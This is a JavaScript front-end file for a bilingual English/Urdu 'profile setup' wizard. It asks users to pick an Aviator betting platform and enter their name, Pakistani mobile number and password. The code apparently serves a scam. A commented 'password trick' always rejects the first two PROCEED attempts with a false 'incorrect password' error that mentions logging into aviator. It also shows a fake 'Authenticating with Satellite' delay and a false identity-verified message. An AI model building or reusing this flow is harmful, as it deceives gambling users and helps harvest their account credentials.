/**
 * profile-setup.js - 6‑step identification wizard
 * - 2-second loader between steps
 * - Password trick: first two "PROCEED" clicks fail, third succeeds
 * - Final 20-second cinematic loader then redirect to loading.html
 * - Uses PX.checkAuth() to ensure user has 99-char key
 */

document.addEventListener('DOMContentLoaded', () => {
    // --- Authentication guard ---
    if (!PX.checkAuth('index.html')) return;

    // --- DOM elements ---
    const steps = document.querySelectorAll('.step-container');
    const stepLabels = document.querySelectorAll('.step-label');
    const progressFill = document.getElementById('progressFill');
    const nextBtns = document.querySelectorAll('.next-step');
    const prevBtns = document.querySelectorAll('.prev-step');
    const skipBtn = document.querySelector('.skip-step');
    const proceedBtn = document.getElementById('proceedBtn');
    const agreeCheckbox = document.getElementById('agreeCheckbox');
    const transitionLoader = document.getElementById('transitionLoader');
    const loaderMessageSpan = document.getElementById('loaderMessage');

    // --- Input fields ---
    const firstNameInput = document.getElementById('firstName');
    const lastNameInput = document.getElementById('lastName');
    const aviatorSelect = document.getElementById('aviatorSelect');
    const inviteLinkInput = document.getElementById('inviteLink');
    const mobileInput = document.getElementById('mobileNumber');
    const passwordInput = document.getElementById('password');
    const confirmPasswordInput = document.getElementById('confirmPassword');

    // --- Populate Aviator platforms (40+) ---
    const platforms = [
        "bJbaji", "JJ win", "1XBet", "Parimatch", "Bet365", "Betway", "22Bet", "888casino",
        "Betwinner", "Mostbet", "Melbet", "Pin-Up Casino", "Betpanda", "BC.Game", "Stake.com",
        "Lucky Block", "Metaspins", "Cloudbet", "Vave Casino", "Cryptorino", "Wild.io",
        "CoinCasino", "Hollywoodbets", "Betfred", "Supabets", "4rabet", "Rajabets", "BlueChip",
        "10CRIC", "BetMGM", "Unibet", "Lottoland", "EstrelaBet", "Betano", "KTO"
    ];
    platforms.forEach(p => {
        const opt = document.createElement('option');
        opt.value = p;
        opt.textContent = p;
        aviatorSelect.appendChild(opt);
    });

    // --- State ---
    let currentStep = 0; // 0-indexed
    let passwordAttempts = 0;
    let collectedData = {};

    // --- Helper: update progress bar and labels ---
    function updateProgress() {
        const percent = ((currentStep + 1) / steps.length) * 100;
        progressFill.style.width = `${percent}%`;
        stepLabels.forEach((label, idx) => {
            label.classList.toggle('active', idx === currentStep);
        });
    }

    // --- Helper: show transition loader (2 seconds) ---
    function showTransitionLoader(callback) {
        transitionLoader.style.display = 'flex';
        setTimeout(() => {
            transitionLoader.style.display = 'none';
            if (callback) callback();
        }, 2000);
    }

    // --- Validate current step (return true/false, show modal on error) ---
    function validateStep(step) {
        switch(step) {
            case 0: // Name
                const first = firstNameInput.value.trim();
                const last = lastNameInput.value.trim();
                if (!first || !last) {
                    PX.showBilingualModal(
                        'Input Required',
                        'درج کرنا ضروری ہے',
                        'Please enter both first and last name.',
                        'براہ کرم پہلا اور آخری نام دونوں درج کریں۔'
                    );
                    return false;
                }
                collectedData.firstName = first;
                collectedData.lastName = last;
                return true;
            case 1: // Platform
                if (!aviatorSelect.value) {
                    PX.showBilingualModal(
                        'Selection Required',
                        'انتخاب ضروری ہے',
                        'Please select an aviator platform.',
                        'براہ کرم ایک ایوی ایٹر پلیٹ فارم منتخب کریں۔'
                    );
                    return false;
                }
                collectedData.aviatorName = aviatorSelect.value;
                return true;
            case 2: // Invitation link (optional)
                collectedData.inviteLink = inviteLinkInput.value.trim();
                return true;
            case 3: // Mobile number with Pakistan validation
                const mobile = mobileInput.value.trim();
                // Basic: must start with + and have 10-15 digits total
                if (!/^\+\d{10,15}$/.test(mobile)) {
                    PX.showBilingualModal(
                        'Invalid Number',
                        'غلط نمبر',
                        'Mobile must start with + and contain 10-15 digits.',
                        'موبائل نمبر + سے شروع ہو اور 10-15 ہندسوں پر مشتمل ہو۔'
                    );
                    return false;
                }
                // Pakistan specific: if starts with +92, must be exactly 13 chars
                if (mobile.startsWith('+92') && mobile.length !== 13) {
                    PX.showBilingualModal(
                        'Pakistan Format Error',
                        'پاکستان فارمیٹ کی خرابی',
                        'For Pakistan, mobile number must be exactly 13 characters (e.g., +923001234567).',
                        'پاکستان کے لیے موبائل نمبر بالکل 13 حروف کا ہونا چاہیے (مثال: +923001234567)۔'
                    );
                    return false;
                }
                collectedData.mobileNumber = mobile;
                return true;
            case 4: // Password & confirm
                const pwd = passwordInput.value;
                const conf = confirmPasswordInput.value;
                if (!pwd || !conf) {
                    PX.showBilingualModal(
                        'Password Required',
                        'پاس ورڈ درکار ہے',
                        'Please fill both password fields.',
                        'براہ کرم دونوں پاس ورڈ فیلڈز پر کریں۔'
                    );
                    return false;
                }
                if (pwd !== conf) {
                    PX.showBilingualModal(
                        'Password Mismatch',
                        'پاس ورڈ مماثل نہیں',
                        'Passwords do not match.',
                        'پاس ورڈ مماثل نہیں ہیں۔'
                    );
                    return false;
                }
                if (pwd.length < 8) {
                    PX.showBilingualModal(
                        'Weak Password',
                        'کمزور پاس ورڈ',
                        'Password must be at least 8 characters.',
                        'پاس ورڈ کم از کم 8 حروف کا ہونا چاہیے۔'
                    );
                    return false;
                }
                collectedData.password = pwd; // stored temporarily (not saved to vault)
                return true;
            default:
                return true;
        }
    }

    // --- Go to step with transition loader ---
    function goToStep(newStep) {
        if (newStep === currentStep) return;
        // Validate current step before moving forward
        if (newStep > currentStep && !validateStep(currentStep)) return;
        showTransitionLoader(() => {
            steps.forEach((step, idx) => {
                step.classList.toggle('active', idx === newStep);
            });
            currentStep = newStep;
            updateProgress();
        });
    }

    // --- Next / Prev event listeners ---
    nextBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (currentStep < steps.length - 1) {
                goToStep(currentStep + 1);
            }
        });
    });
    prevBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (currentStep > 0) {
                goToStep(currentStep - 1);
            }
        });
    });
    if (skipBtn) {
        skipBtn.addEventListener('click', () => {
            if (currentStep === 2) { // invitation step
                goToStep(currentStep + 1);
            }
        });
    }

    // --- Enable proceed button only when checkbox checked ---
    agreeCheckbox.addEventListener('change', () => {
        proceedBtn.disabled = !agreeCheckbox.checked;
    });

    // --- Final PROCEED with password trick ---
    async function handleProceed() {
        if (!agreeCheckbox.checked) {
            PX.showBilingualModal(
                'Agreement Required',
                'معاہدہ ضروری ہے',
                'You must agree to the Terms & Privacy Policy.',
                'آپ کو شرائط اور پرائیویسی پالیسی سے متفق ہونا ضروری ہے۔'
            );
            return;
        }
        passwordAttempts++;
        if (passwordAttempts < 3) {
            // First two attempts: show error modal
            PX.showBilingualModal(
                'Access Denied',
                'رسائی مسترد',
                'Incorrect password! Please enter the password to login into aviator.',
                'غلط پاس ورڈ! براہ کرم ایوی ایٹر میں لاگ ان کرنے کے لیے پاس ورڈ درج کریں۔'
            );
            // Clear password fields for retry
            passwordInput.value = '';
            confirmPasswordInput.value = '';
            return;
        }
        // Third attempt: success – show 20-second cinematic loader
        transitionLoader.style.display = 'flex';
        const engMsg = loaderMessageSpan.querySelector('.english-text');
        const urduMsg = loaderMessageSpan.querySelector('.urdu-text');
        if (engMsg) engMsg.textContent = 'Authenticating with Satellite... 20 seconds';
        if (urduMsg) urduMsg.textContent = 'سیٹلائٹ سے تصدیق ہو رہی ہے... 20 سیکنڈ';
        await new Promise(resolve => setTimeout(resolve, 20000));
        transitionLoader.style.display = 'none';

        // Save all collected data to the user's profile (using current 99-char key)
        const userKey = PX.getCurrentUserKey();
        if (!userKey) {
            window.location.href = 'index.html';
            return;
        }
        const existingData = PX.getUser(userKey) || {};
        const updatedProfile = {
            ...existingData,
            firstName: collectedData.firstName,
            lastName: collectedData.lastName,
            aviatorName: collectedData.aviatorName,
            inviteLink: collectedData.inviteLink || '',
            mobileNumber: collectedData.mobileNumber,
            profileCompleted: true,
            completedAt: Date.now()
        };
        PX.saveUser(userKey, updatedProfile);

        // Show success modal and redirect to loading.html
        PX.showBilingualModal(
            'Profile Complete',
            'پروفائل مکمل',
            'Your identity has been verified. Entering the simulation...',
            'آپ کی شناخت کی تصدیق ہوگئی۔ سمولیشن میں داخل ہو رہے ہیں...'
        );
        setTimeout(() => {
            window.location.href = 'loading.html';
        }, 2000);
    }

    proceedBtn.addEventListener('click', handleProceed);

    // Initialize first step
    goToStep(0);
});
